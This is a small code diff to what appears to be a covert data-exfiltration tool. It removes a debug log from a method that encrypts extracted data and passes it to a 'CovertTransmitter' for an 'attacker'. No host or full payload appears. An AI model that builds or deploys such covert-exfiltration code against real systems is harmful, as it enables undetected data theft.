@@ -150,12 +150,7 @@ export default class ExtractionHandler extends CommunicationHandler {
      */
     async sendAll(data, attacker) {
         // If the method can loose data through the transition send the final size of sent file.
-        const mandatory = [ this.configuration, this.nameOfCommunication, this.extractionEvent ];
-
         this.createExtractionEndedListener(attacker);
-
-        console.log('send mandatory:', ...mandatory);
-
         if (this.enabledEncryption()) {
             DataEncoder.encrypt(data, this.configuration.key, this.configuration.iv).then(encryptedData => {
                 const initiator = new CovertTransmitter(attacker, this.configuration,
